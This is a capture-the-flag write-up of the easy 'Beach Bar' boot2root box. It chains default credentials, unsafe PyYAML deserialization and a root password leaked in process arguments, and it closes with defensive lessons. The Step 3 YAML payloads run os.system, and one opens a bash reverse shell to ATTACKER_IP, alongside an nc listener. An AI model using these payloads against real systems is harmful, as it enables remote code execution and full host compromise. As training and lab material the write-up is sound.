# Day - 5

---

**Challenge name:** Beach Bar

**Category:** Boot2Root / Web Exploitation

**Points:** 60

**Difficulty:** Easy

**Date completed:** 1st of August 2026

---

## Summary

A beachside jukebox web app for hotel guests exposes a leftover demo login, a playlist "import" feature that unsafely deserializes YAML, and a systemd service that leaks a password via its process arguments - which turns out to be reused as root's own login password. The path goes: default creds -> unsafe YAML deserialization for RCE as a low-priv user -> credential reuse found via process listing for root.

---

### Step 1: Recon

```bash
nmap -sCV -F 10.49.145.78
```

Only two ports open:

- `22/tcp` - OpenSSH 9.6p1 (key auth only, confirmed later)
- `80/tcp` - Gunicorn, redirecting to `/login` ("Beach Bar // Sign in")

A full port sweep (`-p-`) confirmed nothing else was listening externally - any "hidden service" hinted at in the brief had to be local-only.

---

### Step 2: Default creds on the DJ booth login

The `/login` page source contained an HTML comment left in from a soft-opening deploy, noting that the demo DJ login (`dj` / `dj`) was still enabled and should be swapped out before the season started. Logging in with `dj` / `dj` worked immediately, redirecting to `/dashboard`.

---

### Step 3: Unsafe YAML deserialization in the playlist importer

The dashboard's **Import** page accepts a playlist as YAML (pasted or uploaded) and loads it server side. An initial test uploaded a PHP web shell payload - a dead end, since the stack is Gunicorn/Flask, not PHP, so it was just stored and reflected back as plain text with no execution.

Since the backend is Python and the feature parses YAML, the more relevant target was PyYAML's `yaml.load()`, which - unless explicitly restricted to `SafeLoader` - allows constructing arbitrary Python objects from tags in the input, including calling functions. Testing with:

```yaml
!!python/object/apply:os.system
args: ["id"]
```

returned `0` in the "Loaded Playlist" box - the exit code of a successfully executed command, confirming RCE. Swapping to a reverse shell payload:

```yaml
!!python/object/apply:os.system
args: ["bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"]
```

with a listener running (`nc -lvnp 4444`) landed a shell as `bartender`.

Reading the Flask source later (`app.py`) confirmed the exact vulnerable line:

```python
parsed = yaml.load(content, Loader=yaml.Loader)
```

---

### Step 4: User flag

```bash
find / -iname "user.txt" 2>/dev/null
cat /home/bartender/user.txt
```

```
THM{REDACTED}
```

---

### Step 5: Enumerating for privesc

`sudo -l` required a password (none known), and no writable SUID/cron/service files were found. Checking running services revealed a second, unrelated systemd unit:

```bash
systemctl list-units --type=service --all | grep -i jukebox
```

```
jukeboxd.service   loaded active running  Beach Bar jukebox streaming daemon
```

```bash
ps aux | grep jukeboxd
```

```
root   608  ...  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass [REDACTED] --bitrate 320k
```

The daemon runs as **root**, and its startup password was passed as a plaintext CLI argument and fully visible to any local user via `ps aux`. The daemon script itself turned out to be a harmless dummy (just cycles a hardcoded "now playing" list), meaning the leaked string wasn't protecting the service at all and it was a credential planted for reuse elsewhere.

A rabbit hole worth noting: a separate `badr.service` was found in a failed state (`ExecStartPre=/bin/chmod +x /etc/badr/badr` failing because the file didn't exist), which looked like a promising race-condition/privesc vector. It wasn't - `NRestarts=6` showed it had already exhausted its restart budget at boot, `/etc/badr/` was root-owned and not writable, and `polkit` blocked `systemctl start/restart` without root's own password. This turned out to be a dead end / red herring.

---

### Step 6: Credential reuse -> root

The leaked stream password didn't work for `su bartender`, `su ubuntu`, or SSH (key-auth only) - but trying it directly against **root** succeeded:

```bash
su root
Password: [REDACTED]
```

```bash
cat /root/root.txt
```

```
THM{REDACTED}
```

---

## Why this worked

Three separate mistakes chained together: a demo login left enabled in production, `yaml.load()` used with the unsafe default `Loader` instead of `SafeLoader` (letting arbitrary object construction turn into arbitrary command execution), and a service password passed as a CLI argument - which is always visible to any local user via `/proc` or `ps aux` regardless of file permissions. The root cause of the final step wasn't the daemon itself, but that whoever set up the box **reused** the same password for root's own account. Any one of these three issues would have been serious on its own; together they gave a full chain from anonymous access to root.

---

## Lessons Learned

- Never ship a "demo" or default login into production, even temporarily - it's the first thing checked and the easiest to miss removing.
- `yaml.load()` without `Loader=yaml.SafeLoader` is equivalent to `pickle.loads()` on attacker-controlled input - always use `safe_load()` (or `SafeLoader`) unless you specifically need to deserialize Python objects from a *trusted* source.
- Command-line arguments are not a secure way to pass secrets to a process - anyone on the box can read them via `ps aux`, `/proc/<pid>/cmdline`, etc. Use environment files, secrets managers, or config files with restrictive permissions instead.
- Credential reuse across service accounts and privileged accounts (like root) turns a low-value leak into a full compromise. Every account should have a unique credential.
- Not every unusual/failed systemd unit is the intended path - `badr.service` looked highly suspicious (custom name, failing `ExecStartPre`, root-owned) but was a deliberate red herring; it's worth timeboxing a lead and stepping back to simpler explanations (like just testing a known leaked credential against the account you actually want) before going deep on a complex race condition.
